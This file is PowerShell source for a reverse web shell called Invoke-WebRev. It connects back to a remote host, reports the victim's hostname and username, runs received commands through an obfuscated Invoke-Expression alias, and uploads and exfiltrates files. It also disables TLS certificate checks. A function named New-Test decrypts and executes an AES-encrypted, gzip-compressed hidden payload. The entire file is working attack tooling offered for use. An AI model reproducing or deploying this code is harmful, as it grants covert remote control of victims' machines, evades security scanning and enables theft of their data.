function Invoke-WebRev{
    param
    (
        [string]$ip,
        [string]$port,
        [switch]$ssl
    )

    $help=@"

.SYNOPSIS
    WebRev.
    PowerShell Function: Invoke-WebRev
    Author: Hector de Armas (3v4Si0N)

    Dependencias Requeridas: Ninguna
    Dependencias Opcionales: Ninguna
.DESCRIPTION
    .

.ARGUMENTS
    -ip   <IP>      Remote Host
    -port <PORT>    Remote Port
    -ssl            Send traffic over ssl

.EXAMPLE
    Invoke-Webrev -ip 192.168.29.131 -port 80
    Invoke-Webrev -ip 192.168.29.131 -port 443 -ssl
"@

    if(-not $ip -or -not $port) { return $help; }
    
    if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }

    [array]$shurmano = "I","n","t","E","r","n","e","X" ;set-alias taleska-ei-vrixeka $($shurmano | foreach { if ($_ -cmatch '[A-Z]' -eq $true) {$x += $_}}; $x)
    New-Test;
    $pwd_b64 = getPwd;
    $hname = toBase64 -str "$env:computername";
    $cuser = toBase64 -str "$env:username";

    $json = '{"type":"newclient", "result":"", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}';
    
    [System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy();
    [System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;
    $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12';
    [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols;
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

    try { $error[0] = ""; } catch {}

    $previous_functions = (ls function:).Name
    [array]$preloaded_functions = (ls function: | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream );

    while ($true)
    {
        try
        {
            $req = Invoke-WebRequest $url -useb -Method POST -Body $json -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" -ContentType "application/json";
            $header = $req.Headers["Authorization"];
            $c = [System.Convert]::FromBase64String($header);
            $cstr = [System.Text.Encoding]::UTF8.GetString($c);
            $result = "";
            $dataToSend = "";

            if($cstr.split(" ")[0] -eq "autocomplete")
            {
                $functs = (Get-Command | Where-Object {($_.name).Length -ge "4"} | select-object name | format-table -HideTableHeaders | Out-String -Stream);
                $functs = toBase64 -str "$functs";
                $type = '"type":"4UT0C0MPL3T3"';
                $result = $functs;
            }
            elseif($cstr.split(" ")[0] -eq "upload")
            {
                $type = '"type":"UPL04D"';
                try
                {
                    $uploadData = [System.Text.Encoding]::ASCII.GetString($req.Content);
                    if ($cstr.split(" ").Length -eq 3) {
                        $location = $cstr.split(" ")[2];
                    }
                    elseif ($cstr.Substring($cstr.Length-1) -eq '"') {
                        $location = $cstr.split('"') | Select-Object -SkipLast 1 | Select-Object -Last 1;
                    }
                    else {
                        $location = $cstr.split(' ') | Select-Object -Last 1;;
                    }
                    $content = [System.Convert]::FromBase64String($uploadData);
                    $content | Set-Content $location -Encoding Byte
                    $result = '[+] File successfully uploaded.';
                }
                catch {}
            }
            elseif($cstr.split(" ")[0] -eq "download")
            {
                $type = '"type":"D0WNL04D"';
                try
                {
                    if ($cstr.split(" ").Length -eq 3){
                        $cstr = $cstr.Replace('"', '');
                        $pathSrc = $cstr.split(" ")[1];
                        $pathDst = $cstr.split(" ")[2];
                    }
                    elseif ($cstr.Substring($cstr.Length-1) -eq '"'){
                        if ($cstr.split(' ')[1][0] -eq '"') {
                            $pathSrc = $cstr.split('"')[1];
                        } else {
                            $pathSrc = $cstr.split(' ')[1];
                        }
                        $pathDst = $cstr.split('"')[-2];
                    }
                    else{
                        $pathSrc = $cstr.split('"')[1];
                        $pathDst = $cstr.split(' ')[-1];
                    }

                    if (Test-Path -Path $pathSrc) 
                    {
                        $downloadData = [System.IO.File]::ReadAllBytes($pathSrc);
                        $b64 = [System.Convert]::ToBase64String($downloadData);
                        $result = '[+] File successfully downloaded.", ' + '"file":"' + $b64 + '", ' + '"pathDst":"' + $pathDst;
                    } 
                    else
                    {
                        $type = '"type":"3RR0R"';
                        $result = '[!] Source file not found!';
                    }
                }
                catch {}
            }
            else
            {
                $type = '"type":"C0MM4ND"';                
                $enc = [system.Text.Encoding]::UTF8;
                $new = (taleska-ei-vrixeka $cstr | Out-String);

                $bytes = $enc.GetBytes($new);
                $bytes2 = $enc.GetBytes($result);
                $result = [Convert]::ToBase64String($bytes2 + $bytes);
            }

            if ($cstr.split(" ")[0] -eq "cd") {
                $pwd_b64 = getPwd;
            }
            $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '"}';
        }
        catch
        {
            if ($error[0] -ne "")
            {
                try
                {
                    $type = '"type":"3RR0R"';
                    $err = $error[0] | Out-String;
                    $error[0]= "";

                    $bytes = $enc.GetBytes($err);
                    $result = [Convert]::ToBase64String($bytes);
                    $json = '{' + $type + ', "result":"' + $result + '", "pwd":"' + $pwd_b64 + '", "cuser":"' + $cuser + '", "hostname":"' + $hname + '"}'
                } catch {}
            }
        };
    };
}

function toBase64
{
    Param([String] $str)

    $enc = [system.Text.Encoding]::UTF8;
    $bytes = $enc.GetBytes($str);
    $result = [Convert]::ToBase64String($bytes);
    return $result;
}

function getPwd()
{
    $enc = [system.Text.Encoding]::UTF8;
    $pwd = "pwd | Format-Table -HideTableHeaders";
    $pwd_res = (taleska-ei-vrixeka $pwd | Out-String);
    $bytes = $enc.GetBytes($pwd_res);
    $pwd_b64 = [Convert]::ToBase64String($bytes);
    return $pwd_b64;
}

function Get-ImportedFunctions
{
    $menu = @"

         By: 3v4Si0N
"@

    if ([int]$PSVersionTable.PSVersion.Major -ge 4 ) {
        $current_functions = (ls function:).Name
        [array]$preloaded_functions = "Close_Console","Close_DNS","Close_TCP","Close_UDP","Main","Main_Powershell","ReadData_CMD","ReadData_Console","ReadData_DNS","ReadData_TCP","ReadData_UDP","Setup_CMD","Setup_Console","Setup_DNS","Setup_TCP","Setup_UDP", "Stream1_Close","Stream1_ReadData","Stream1_Setup","Stream1_WriteData","WriteData_CMD","WriteData_Console","WriteData_DNS","WriteData_TCP","WriteData_UDP","Close_CMD","menu","f","func"
        $current_functions = $current_functions + $preloaded_functions
        $new_functions = (Compare-Object -ReferenceObject $previous_functions -DifferenceObject $current_functions).InputObject
        $output = foreach ($new_function in $new_functions) { if ($preloaded_functions -notcontains $new_function) {"`n [+] $new_function"}}
        $menu = $menu + $output + "`n";
    } else {
        [array]$new_functions = (ls function: | Where-Object {($_.name).Length -ge "4" -and $_.name -notlike "Close_*" -and $_.name -notlike "ReadData_*" -and $_.name -notlike "Setup_*" -and $_.name -notlike "Stream1_*" -and $_.name -notlike "WriteData_*" -and $_.name -notlike "Menu" -and $_.name -ne "f" -and $_.name -ne "func" -and $_.name -ne "Main" -and $_.name -ne "Main_Powershell"} | select-object name | format-table -HideTableHeaders | Out-String -Stream )
        $show_functions = ($new_functions | where {$preloaded_functions -notcontains $_}) | foreach {"`n[+] $_"}
        $show_functions = $show_functions -replace "  ","" 
        $menu = $menu + $show_functions + "`n"
        $menu = $menu -replace " [+]","[+]"
    }
    return $menu;
}

function New-Test
{
    $acie = New-Object "System.Security.Cryptography.AesManaged"
    $cqxhr = [System.Convert]::FromBase64String("zpZ+TbbeHpxqJh/1kzBWDlJn/cAm2VLfjC3sXkyZPv4=")
    $uynqoum = [System.Convert]::FromBase64String("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")
    $acie.IV = $uynqoum[0..15]
    $acie.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $acie.KeySize = 256
    $acie.Key = $cqxhr
    $acie.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $acie.BlockSize = 128
    $zigtgsrjo = New-Object System.IO.MemoryStream(,$acie.CreateDecryptor().TransformFinalBlock($uynqoum,16,$uynqoum.Length-16))
    $cznqbvqdo = New-Object System.IO.MemoryStream
    $poqsw = New-Object System.IO.Compression.GzipStream $zigtgsrjo, ([IO.Compression.CompressionMode]::Decompress)
    $poqsw.CopyTo($cznqbvqdo)
    $tdzam = [System.Text.Encoding]::UTF8.GetString($cznqbvqdo.ToArray())
    $acie.Dispose()
    $zigtgsrjo.Close()
    $poqsw.Close()
    taleska-ei-vrixeka($tdzam)
}

#Invoke-WebRev -ip 192.168.29.130 -port 443 -ssl
